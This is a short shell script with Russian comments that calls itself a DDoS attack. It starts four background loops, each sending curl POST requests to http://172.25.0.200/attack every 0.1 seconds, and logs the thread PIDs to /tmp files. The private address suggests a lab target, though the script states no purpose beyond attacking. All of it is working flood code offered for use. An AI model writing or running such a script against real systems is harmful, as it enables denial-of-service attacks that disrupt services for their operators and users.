#!/bin/sh

TARGET="http://172.25.0.200/attack"
THREADS=4
LOG_FILE="/tmp/attack.log"

# Функция атаки (совместимая с /bin/sh)
attack() {
    while true; do
        curl -s -X POST "$TARGET" >/dev/null 2>&1
        sleep 0.1
    done
}

# Очистка лога и запуск
echo "Starting DDoS attack to $TARGET" > $LOG_FILE
for i in $(seq 1 $THREADS); do
    attack &
    echo "Started thread $i (PID $!)" >> $LOG_FILE
    echo $! >> /tmp/attack.pids
done